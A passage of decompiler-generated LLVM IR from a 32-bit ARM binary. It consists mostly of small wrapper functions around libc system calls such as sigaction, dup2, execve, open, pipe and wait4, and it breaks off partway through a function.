  %v3_10d10 = load i32, i32* @r2, align 4
  %v4_10d10 = inttoptr i32 %v3_10d10 to %sigaction*
  %v5_10d10 = call i32 @sigaction(i32 %arg1, %sigaction* %v2_10d10, %sigaction* %v4_10d10)
  store i32 %v5_10d10, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_10d10, -4095
  br i1 %tmp, label %dec_label_pc_10d30, label %dec_label_pc_10d20

dec_label_pc_10d20:                               ; preds = %dec_label_pc_10d0c
  %v0_10d20 = call i32 @function_cc08()
  %v0_10d24 = load i32, i32* %r4.global-to-local, align 4
  %v1_10d24 = sub i32 0, %v0_10d24
  %v2_10d28 = inttoptr i32 %v0_10d20 to i32*
  store i32 %v1_10d24, i32* %v2_10d28, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10d30

dec_label_pc_10d30:                               ; preds = %dec_label_pc_10d0c, %dec_label_pc_10d20
  %v0_10d30 = phi i32 [ %v5_10d10, %dec_label_pc_10d0c ], [ -1, %dec_label_pc_10d20 ]
  %v2_10d34 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_10d34, i32* %r4.global-to-local, align 4
  ret i32 %v0_10d30

; uselistorder directives
  uselistorder i32 %v5_10d10, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10d30, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @function_10d38(i32 %arg1) local_unnamed_addr #0 {
dec_label_pc_10d38:
  store i32 %arg1, i32* @r5, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @function_10d60(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10d60:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10d60 = load i32, i32* @r4, align 4
  store i32 %v3_10d60, i32* %stack_var_-8, align 4
  %v2_10d64 = call i32 @dup2(i32 %arg1, i32 %arg2)
  store i32 %v2_10d64, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_10d64, -4095
  br i1 %tmp, label %dec_label_pc_10d84, label %dec_label_pc_10d74

dec_label_pc_10d74:                               ; preds = %dec_label_pc_10d60
  %v0_10d74 = call i32 @function_cc08()
  %v0_10d78 = load i32, i32* %r4.global-to-local, align 4
  %v1_10d78 = sub i32 0, %v0_10d78
  %v2_10d7c = inttoptr i32 %v0_10d74 to i32*
  store i32 %v1_10d78, i32* %v2_10d7c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10d84

dec_label_pc_10d84:                               ; preds = %dec_label_pc_10d60, %dec_label_pc_10d74
  %v0_10d84 = phi i32 [ %v2_10d64, %dec_label_pc_10d60 ], [ -1, %dec_label_pc_10d74 ]
  %v2_10d88 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_10d88, i32* @r4, align 4
  ret i32 %v0_10d84

; uselistorder directives
  uselistorder i32 %v2_10d64, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10d84, { 1, 0 }
}

define i32 @function_10d8c() local_unnamed_addr {
dec_label_pc_10d8c:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10d8c = load i32, i32* @r4, align 4
  store i32 %v3_10d8c, i32* %stack_var_-8, align 4
  %v0_10d90 = load i32, i32* @r0, align 4
  %v1_10d90 = inttoptr i32 %v0_10d90 to i8*
  %v2_10d90 = load i32, i32* @r1, align 4
  %v3_10d90 = inttoptr i32 %v2_10d90 to i8*
  %v4_10d90 = insertvalue [1 x i8*] undef, i8* %v3_10d90, 0
  %v5_10d90 = load i32, i32* @r2, align 4
  %v6_10d90 = inttoptr i32 %v5_10d90 to i8*
  %v7_10d90 = insertvalue [1 x i8*] undef, i8* %v6_10d90, 0
  %v8_10d90 = call i32 @execve(i8* %v1_10d90, [1 x i8*] %v4_10d90, [1 x i8*] %v7_10d90)
  store i32 %v8_10d90, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v8_10d90, -4095
  br i1 %tmp, label %dec_label_pc_10db0, label %dec_label_pc_10da0

dec_label_pc_10da0:                               ; preds = %dec_label_pc_10d8c
  %v0_10da0 = call i32 @function_cc08()
  %v0_10da4 = load i32, i32* %r4.global-to-local, align 4
  %v1_10da4 = sub i32 0, %v0_10da4
  %v2_10da8 = inttoptr i32 %v0_10da0 to i32*
  store i32 %v1_10da4, i32* %v2_10da8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10db0

dec_label_pc_10db0:                               ; preds = %dec_label_pc_10d8c, %dec_label_pc_10da0
  %v0_10db0 = phi i32 [ %v8_10d90, %dec_label_pc_10d8c ], [ -1, %dec_label_pc_10da0 ]
  %v2_10db4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_10db4, i32* %r4.global-to-local, align 4
  ret i32 %v0_10db0

; uselistorder directives
  uselistorder i32 %v8_10d90, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10db0, { 1, 0 }
}

define i32 @function_10db8() local_unnamed_addr {
dec_label_pc_10db8:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10db8 = load i32, i32* @r4, align 4
  store i32 %v3_10db8, i32* %stack_var_-8, align 4
  %v0_10dc0 = load i32, i32* @r0, align 4
  store i32 %v0_10dc0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10dc0, -4095
  br i1 %tmp, label %dec_label_pc_10ddc, label %dec_label_pc_10dcc

dec_label_pc_10dcc:                               ; preds = %dec_label_pc_10db8
  %v0_10dcc = call i32 @function_cc08()
  %v0_10dd0 = load i32, i32* %r4.global-to-local, align 4
  %v1_10dd0 = sub i32 0, %v0_10dd0
  %v2_10dd4 = inttoptr i32 %v0_10dcc to i32*
  store i32 %v1_10dd0, i32* %v2_10dd4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_10de0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10ddc

dec_label_pc_10ddc:                               ; preds = %dec_label_pc_10db8, %dec_label_pc_10dcc
  %v2_10de0 = phi i32 [ %v3_10db8, %dec_label_pc_10db8 ], [ %v2_10de0.pre, %dec_label_pc_10dcc ]
  %v0_10ddc = phi i32 [ %v0_10dc0, %dec_label_pc_10db8 ], [ -1, %dec_label_pc_10dcc ]
  store i32 %v2_10de0, i32* @r4, align 4
  ret i32 %v0_10ddc

; uselistorder directives
  uselistorder i32 %v0_10dc0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10ddc, { 1, 0 }
}

define i32 @function_10de4() local_unnamed_addr {
dec_label_pc_10de4:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10de4 = load i32, i32* @r4, align 4
  store i32 %v3_10de4, i32* %stack_var_-8, align 4
  %v0_10dec = load i32, i32* @r0, align 4
  store i32 %v0_10dec, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10dec, -4095
  br i1 %tmp, label %dec_label_pc_10e08, label %dec_label_pc_10df8

dec_label_pc_10df8:                               ; preds = %dec_label_pc_10de4
  %v0_10df8 = call i32 @function_cc08()
  %v0_10dfc = load i32, i32* %r4.global-to-local, align 4
  %v1_10dfc = sub i32 0, %v0_10dfc
  %v2_10e00 = inttoptr i32 %v0_10df8 to i32*
  store i32 %v1_10dfc, i32* %v2_10e00, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_10e0c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10e08

dec_label_pc_10e08:                               ; preds = %dec_label_pc_10de4, %dec_label_pc_10df8
  %v2_10e0c = phi i32 [ %v3_10de4, %dec_label_pc_10de4 ], [ %v2_10e0c.pre, %dec_label_pc_10df8 ]
  %v0_10e08 = phi i32 [ %v0_10dec, %dec_label_pc_10de4 ], [ -1, %dec_label_pc_10df8 ]
  store i32 %v2_10e0c, i32* @r4, align 4
  ret i32 %v0_10e08

; uselistorder directives
  uselistorder i32 %v0_10dec, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10e08, { 1, 0 }
}

define i32 @function_10e10(i32 %arg1) local_unnamed_addr {
dec_label_pc_10e10:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10e10 = load i32, i32* @r4, align 4
  store i32 %v3_10e10, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_10e34, label %dec_label_pc_10e24

dec_label_pc_10e24:                               ; preds = %dec_label_pc_10e10
  %v0_10e24 = call i32 @function_cc08()
  %v0_10e28 = load i32, i32* %r4.global-to-local, align 4
  %v1_10e28 = sub i32 0, %v0_10e28
  %v2_10e2c = inttoptr i32 %v0_10e24 to i32*
  store i32 %v1_10e28, i32* %v2_10e2c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_10e38.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10e34

dec_label_pc_10e34:                               ; preds = %dec_label_pc_10e10, %dec_label_pc_10e24
  %v2_10e38 = phi i32 [ %v3_10e10, %dec_label_pc_10e10 ], [ %v2_10e38.pre, %dec_label_pc_10e24 ]
  %v0_10e34 = phi i32 [ %arg1, %dec_label_pc_10e10 ], [ -1, %dec_label_pc_10e24 ]
  store i32 %v2_10e38, i32* %r4.global-to-local, align 4
  ret i32 %v0_10e34

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10e34, { 1, 0 }
}

define i32 @function_10e3c() local_unnamed_addr {
dec_label_pc_10e3c:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10e3c = load i32, i32* @r4, align 4
  store i32 %v3_10e3c, i32* %stack_var_-8, align 4
  %v0_10e44 = load i32, i32* @r0, align 4
  store i32 %v0_10e44, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10e44, -4095
  br i1 %tmp, label %dec_label_pc_10e60, label %dec_label_pc_10e50

dec_label_pc_10e50:                               ; preds = %dec_label_pc_10e3c
  %v0_10e50 = call i32 @function_cc08()
  %v0_10e54 = load i32, i32* %r4.global-to-local, align 4
  %v1_10e54 = sub i32 0, %v0_10e54
  %v2_10e58 = inttoptr i32 %v0_10e50 to i32*
  store i32 %v1_10e54, i32* %v2_10e58, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_10e64.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10e60

dec_label_pc_10e60:                               ; preds = %dec_label_pc_10e3c, %dec_label_pc_10e50
  %v2_10e64 = phi i32 [ %v3_10e3c, %dec_label_pc_10e3c ], [ %v2_10e64.pre, %dec_label_pc_10e50 ]
  %v0_10e60 = phi i32 [ %v0_10e44, %dec_label_pc_10e3c ], [ -1, %dec_label_pc_10e50 ]
  store i32 %v2_10e64, i32* %r4.global-to-local, align 4
  ret i32 %v0_10e60

; uselistorder directives
  uselistorder i32 %v0_10e44, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10e60, { 1, 0 }
}

define i32 @function_10e68(%timespec* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10e68:
  %r4.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg2 to %timespec*
  %stack_var_-8 = alloca i32, align 4
  %v3_10e68 = load i32, i32* @r4, align 4
  store i32 %v3_10e68, i32* %stack_var_-8, align 4
  %v6_10e6c = call i32 @nanosleep(%timespec* %arg1, %timespec* %tmp)
  store i32 %v6_10e6c, i32* %r4.global-to-local, align 4
  %tmp6 = icmp ult i32 %v6_10e6c, -4095
  br i1 %tmp6, label %dec_label_pc_10e8c, label %dec_label_pc_10e7c

dec_label_pc_10e7c:                               ; preds = %dec_label_pc_10e68
  %v0_10e7c = call i32 @function_cc08()
  %v0_10e80 = load i32, i32* %r4.global-to-local, align 4
  %v1_10e80 = sub i32 0, %v0_10e80
  %v2_10e84 = inttoptr i32 %v0_10e7c to i32*
  store i32 %v1_10e80, i32* %v2_10e84, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10e8c

dec_label_pc_10e8c:                               ; preds = %dec_label_pc_10e68, %dec_label_pc_10e7c
  %v0_10e8c = phi i32 [ %v6_10e6c, %dec_label_pc_10e68 ], [ -1, %dec_label_pc_10e7c ]
  %v2_10e90 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_10e90, i32* %r4.global-to-local, align 4
  ret i32 %v0_10e8c

; uselistorder directives
  uselistorder i32 %v6_10e6c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10e8c, { 1, 0 }
}

define i32 @function_10e94(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10e94:
  %r4.global-to-local = alloca i32, align 4
  %v1_10ea4 = and i32 %arg2, 64
  %v2_10ea4 = icmp eq i32 %v1_10ea4, 0
  br i1 %v2_10ea4, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_10e94
  %v6_10e94 = load i32, i32* @r2, align 4
  %phitmp = urem i32 %v6_10e94, 65536
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_10e94, %bb
  %v0_10eb4 = phi i32 [ 0, %dec_label_pc_10e94 ], [ %phitmp, %bb ]
  store i32 %v0_10eb4, i32* @r2, align 4
  %v4_10ebc = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %arg2)
  %v7_10ec0 = icmp eq i32 %v4_10ebc, -4096
  store i1 %v7_10ec0, i1* @cpsr_z, align 1
  store i32 %v4_10ebc, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_10ebc, -4095
  br i1 %tmp, label %dec_label_pc_10edc, label %dec_label_pc_10ecc

dec_label_pc_10ecc:                               ; preds = %.thread1
  %v0_10ecc = call i32 @function_cc08()
  %v0_10ed0 = load i32, i32* %r4.global-to-local, align 4
  %v1_10ed0 = sub i32 0, %v0_10ed0
  %v2_10ed4 = inttoptr i32 %v0_10ecc to i32*
  store i32 %v1_10ed0, i32* %v2_10ed4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10edc

dec_label_pc_10edc:                               ; preds = %.thread1, %dec_label_pc_10ecc
  %v0_10edc = phi i32 [ %v4_10ebc, %.thread1 ], [ -1, %dec_label_pc_10ecc ]
  ret i32 %v0_10edc

; uselistorder directives
  uselistorder i32 %v4_10ebc, { 2, 0, 3, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_10edc, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_10ef0(i32 %arg1) local_unnamed_addr {
dec_label_pc_10ef0:
  store i32 %arg1, i32* @r2, align 4
  %v0_10ef8 = load i32, i32* @r0, align 4
  %v2_10ef8 = inttoptr i32 %v0_10ef8 to i8*
  %v3_10ef8 = call i32 @function_10e94(i8* %v2_10ef8, i32 577)
  %v0_10efc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10efc, label %bb, label %bb2

bb:                                               ; preds = %dec_label_pc_10ef0
  %v6_10efc = and i32 %v3_10ef8, 36
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_10ef0, %bb
  %v7_10efc = phi i32 [ %v3_10ef8, %dec_label_pc_10ef0 ], [ %v6_10efc, %bb ]
  ret i32 %v7_10efc

; uselistorder directives
  uselistorder i32 (i8*, i32)* @function_10e94, { 0, 2, 1 }
  uselistorder i32 577, { 1, 0, 2 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @function_10f00(i32 %arg1) local_unnamed_addr {
dec_label_pc_10f00:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10f00 = load i32, i32* @r4, align 4
  store i32 %v3_10f00, i32* %stack_var_-8, align 4
  %v1_10f04 = insertvalue [2 x i32] undef, i32 %arg1, 0
  %v2_10f04 = call i32 @pipe([2 x i32] %v1_10f04)
  store i32 %v2_10f04, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_10f04, -4095
  br i1 %tmp, label %dec_label_pc_10f24, label %dec_label_pc_10f14

dec_label_pc_10f14:                               ; preds = %dec_label_pc_10f00
  %v0_10f14 = call i32 @function_cc08()
  %v0_10f18 = load i32, i32* %r4.global-to-local, align 4
  %v1_10f18 = sub i32 0, %v0_10f18
  %v2_10f1c = inttoptr i32 %v0_10f14 to i32*
  store i32 %v1_10f18, i32* %v2_10f1c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10f24

dec_label_pc_10f24:                               ; preds = %dec_label_pc_10f00, %dec_label_pc_10f14
  %v0_10f24 = phi i32 [ %v2_10f04, %dec_label_pc_10f00 ], [ -1, %dec_label_pc_10f14 ]
  %v2_10f28 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_10f28, i32* @r4, align 4
  ret i32 %v0_10f24

; uselistorder directives
  uselistorder i32 %v2_10f04, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10f24, { 1, 0 }
}

define i32 @function_10f2c(i32 %arg1) local_unnamed_addr {
dec_label_pc_10f2c:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_10f2c = load i32, i32* @r4, align 4
  store i32 %v3_10f2c, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i32* @global_var_1aaec.522 to i32), i32* %r4.global-to-local, align 4
  %v2_10f34 = load i32, i32* @global_var_1aaec.522, align 4
  %v2_10f38 = icmp eq i32 %v2_10f34, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v2_10f38, label %dec_label_pc_10f48, label %dec_label_pc_10f54

dec_label_pc_10f48:                               ; preds = %dec_label_pc_10f2c
  %v2_10f48 = call i32 @function_133cc(i32* null)
  %v1_10f4c = icmp slt i32 %v2_10f48, 0
  br i1 %v1_10f4c, label %dec_label_pc_10f74, label %dec_label_pc_10f54thread-pre-split

dec_label_pc_10f54thread-pre-split:               ; preds = %dec_label_pc_10f48
  %v0_10f58.pr = load i32, i32* %r5.global-to-local, align 4
  %v2_10f54.pre = load i32, i32* @global_var_1aaec.522, align 4
  br label %dec_label_pc_10f54

dec_label_pc_10f54:                               ; preds = %dec_label_pc_10f54thread-pre-split, %dec_label_pc_10f2c
  %v2_10f54 = phi i32 [ %v2_10f54.pre, %dec_label_pc_10f54thread-pre-split ], [ %v2_10f34, %dec_label_pc_10f2c ]
  %v1_10f60 = phi i32 [ %v0_10f58.pr, %dec_label_pc_10f54thread-pre-split ], [ %arg1, %dec_label_pc_10f2c ]
  %v2_10f58 = icmp eq i32 %v1_10f60, 0
  store i32 %v2_10f54, i32* %r4.global-to-local, align 4
  br i1 %v2_10f58, label %dec_label_pc_10f78, label %dec_label_pc_10f68

dec_label_pc_10f68:                               ; preds = %dec_label_pc_10f54
  %v2_10f60 = add i32 %v1_10f60, %v2_10f54
  %v1_10f68 = inttoptr i32 %v2_10f60 to i32*
  %v2_10f68 = call i32 @function_133cc(i32* %v1_10f68)
  %v1_10f6c = icmp slt i32 %v2_10f68, 0
  br i1 %v1_10f6c, label %dec_label_pc_10f74, label %dec_label_pc_10f68.dec_label_pc_10f78_crit_edge

dec_label_pc_10f68.dec_label_pc_10f78_crit_edge:  ; preds = %dec_label_pc_10f68
  %v0_10f78.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10f78

dec_label_pc_10f74:                               ; preds = %dec_label_pc_10f68, %dec_label_pc_10f48
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10f78

dec_label_pc_10f78:                               ; preds = %dec_label_pc_10f68.dec_label_pc_10f78_crit_edge, %dec_label_pc_10f54, %dec_label_pc_10f74
  %v0_10f78 = phi i32 [ %v0_10f78.pre, %dec_label_pc_10f68.dec_label_pc_10f78_crit_edge ], [ %v2_10f54, %dec_label_pc_10f54 ], [ -1, %dec_label_pc_10f74 ]
  %v2_10f7c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_10f7c, i32* @r4, align 4
  ret i32 %v0_10f78

; uselistorder directives
  uselistorder i32 %v2_10f54, { 1, 0, 2 }
  uselistorder i32* null, { 0, 1, 2, 3, 7, 4, 5, 6, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder label %dec_label_pc_10f78, { 2, 0, 1 }
}

define i32 @function_10f84(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10f84:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10f84 = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v3_10f84, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_10f84
  %v3_10f8c5 = load i32, i32* @r4, align 4
  store i32 %v3_10f8c5, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10fac

bb:                                               ; preds = %dec_label_pc_10f84
  %v3_10f8c = load i32, i32* @r4, align 4
  store i32 %v3_10f8c, i32* %stack_var_-8, align 4
  %tmp12 = icmp ult i32 %arg1, 3
  br i1 %tmp12, label %dec_label_pc_10fac, label %dec_label_pc_10f98

dec_label_pc_10f98:                               ; preds = %bb
  %v0_10f98 = call i32 @function_cc08()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_10fa4 = inttoptr i32 %v0_10f98 to i32*
  store i32 22, i32* %v2_10fa4, align 4
  %v0_10fd0.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10fd0

dec_label_pc_10fac:                               ; preds = %.thread, %bb
  %v7_10fac = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp)
  store i32 %v7_10fac, i32* %r4.global-to-local, align 4
  %tmp13 = icmp ult i32 %v7_10fac, -4095
  br i1 %tmp13, label %dec_label_pc_10fcc, label %dec_label_pc_10fbc

dec_label_pc_10fbc:                               ; preds = %dec_label_pc_10fac
  %v0_10fbc = call i32 @function_cc08()
  %v0_10fc0 = load i32, i32* %r4.global-to-local, align 4
  %v1_10fc0 = sub i32 0, %v0_10fc0
  %v2_10fc4 = inttoptr i32 %v0_10fbc to i32*
  store i32 %v1_10fc0, i32* %v2_10fc4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10fcc

dec_label_pc_10fcc:                               ; preds = %dec_label_pc_10fac, %dec_label_pc_10fbc
  %v0_10fcc = phi i32 [ %v7_10fac, %dec_label_pc_10fac ], [ -1, %dec_label_pc_10fbc ]
  store i32 %v0_10fcc, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10fd0

dec_label_pc_10fd0:                               ; preds = %dec_label_pc_10f98, %dec_label_pc_10fcc
  %v0_10fd0 = phi i32 [ %v0_10fd0.pre, %dec_label_pc_10f98 ], [ %v0_10fcc, %dec_label_pc_10fcc ]
  %v2_10fd4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_10fd4, i32* @r4, align 4
  ret i32 %v0_10fd0

; uselistorder directives
  uselistorder i32 %v7_10fac, { 1, 0, 2 }
  uselistorder i32* %stack_var_-8, { 1, 2, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10fd0, { 1, 0 }
  uselistorder label %dec_label_pc_10fcc, { 1, 0 }
  uselistorder label %dec_label_pc_10fac, { 1, 0 }
}

define i32 @function_10fd8() local_unnamed_addr {
dec_label_pc_10fd8:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10fd8 = load i32, i32* @r4, align 4
  store i32 %v3_10fd8, i32* %stack_var_-8, align 4
  %v0_10fdc = load i32, i32* @r0, align 4
  %v1_10fdc = load i32, i32* @r1, align 4
  %v2_10fdc = load i32, i32* @r2, align 4
  %v3_10fdc = load i32, i32* @r3, align 4
  %v4_10fdc = inttoptr i32 %v3_10fdc to %rusage*
  %v5_10fdc = call i32 @wait4(i32 %v0_10fdc, i32 %v1_10fdc, i32 %v2_10fdc, %rusage* %v4_10fdc)
  store i32 %v5_10fdc, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_10fdc, -4095
  br i1 %tmp, label %dec_label_pc_10ffc, label %dec_label_pc_10fec

dec_label_pc_10fec:                               ; preds = %dec_label_pc_10fd8
  %v0_10fec = call i32 @function_cc08()
  %v0_10ff0 = load i32, i32* %r4.global-to-local, align 4
  %v1_10ff0 = sub i32 0, %v0_10ff0
  %v2_10ff4 = inttoptr i32 %v0_10fec to i32*
  store i32 %v1_10ff0, i32* %v2_10ff4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10ffc

dec_label_pc_10ffc:                               ; preds = %dec_label_pc_10fd8, %dec_label_pc_10fec
  %v0_10ffc = phi i32 [ %v5_10fdc, %dec_label_pc_10fd8 ], [ -1, %dec_label_pc_10fec ]
  %v2_11000 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_11000, i32* @r4, align 4
  ret i32 %v0_10ffc

; uselistorder directives
  uselistorder i32 %v5_10fdc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10ffc, { 1, 0 }
}

define i32 @function_11004() local_unnamed_addr {
dec_label_pc_11004:
  ret i32 ptrtoint (i32* @global_var_1aacc.524 to i32)
}

define i32 @function_11010(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_11010:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v2_11014 = icmp eq i32 %arg1, 0
  br i1 %v2_11014, label %bb, label %.thread

.thread:                                          ; preds = %dec_label_pc_11010
  br label %bb11

bb:                                               ; preds = %dec_label_pc_11010
  %v3_1101c = ptrtoint i32* %stack_var_-32 to i32
  br label %bb11

bb11:                                             ; preds = %.thread, %bb
  %v0_11044 = phi i32 [ %arg2, %.thread ], [ 0, %bb ]
  %v0_11038 = phi i32 [ %arg1, %.thread ], [ %v3_1101c, %bb ]
  store i32 %arg3, i32* @r4, align 4
  store i32 16, i32* @r3, align 4
  %v2_11030 = ptrtoint i32* %stack_var_-16 to i32
  %v2_1103c = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_1103c, i32* %stack_var_-16, align 4
  store i32 %v0_11044, i32* %stack_var_-12, align 4
  %v5_1104c = inttoptr i32 %v0_11038 to i8*
  %v6_1104c = call i32 @function_11080(i8* %v5_1104c, i32 %v2_11030, i32 1, i32 16, i32 %arg3)
  %v2_11050 = icmp eq i32 %v6_1104c, 0
  br i1 %v2_11050, label %bb12, label %bb13

bb12:                                             ; preds = %bb11
  br label %bb13

bb13:                                             ; preds = %bb11, %bb12
  %v8_1105c = phi i32 [ %v6_1104c, %bb11 ], [ 1, %bb12 ]
  ret i32 %v8_1105c

; uselistorder directives
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %bb13, { 1, 0 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @function_11060() local_unnamed_addr {
dec_label_pc_11060:
  %v0_1106c = load i32, i32* @r2, align 4
  store i32 %v0_1106c, i32* @r3, align 4
  %v0_11074 = load i32, i32* @r0, align 4
  %v1_11074 = load i32, i32* @r1, align 4
  %v5_11074 = inttoptr i32 %v0_11074 to i8*
  %v6_11074 = call i32 @function_11080(i8* %v5_11074, i32 %v1_11074, i32 -1, i32 %v0_1106c, i32 ptrtoint (i32* @0 to i32))
  ret i32 %v6_11074
}

define i32 @function_11080(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_11080:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11080 = load i32, i32* @r4, align 4
  store i32 %v3_11080, i32* %stack_var_-8, align 4
  %v10_11084 = icmp eq i32 %tmp, %arg2
  br i1 %v10_11084, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_11080
  %v0_1108c1 = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_110a0

bb:                                               ; preds = %dec_label_pc_11080
  %v4_11088 = icmp eq i8* %arg1, null
  %v0_1108c = load i32, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* @ip, align 4
  br i1 %v4_11088, label %dec_label_pc_110a0, label %bb27

bb27:                                             ; preds = %bb
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_110dc

dec_label_pc_110a0:                               ; preds = %.thread, %bb
  %v1_110e0.ph = phi i32 [ %v0_1108c, %bb ], [ %v0_1108c1, %.thread ]
  %v2_110903.ph = ptrtoint i32* %stack_var_-24 to i32
  %v3_110a0 = icmp eq i8* %arg1, null
  store i32 %v2_110903.ph, i32* @ip, align 4
  br i1 %v3_110a0, label %.thread4, label %dec_label_pc_110d4

.thread4:                                         ; preds = %dec_label_pc_110a0
  store i32 %tmp, i32* %r2.global-to-local, align 4
  store i32 -1, i32* @r3, align 4
  br label %dec_label_pc_110dc

dec_label_pc_110b8:                               ; preds = %dec_label_pc_110f4
  %v0_110b8 = call i32 @function_cc08()
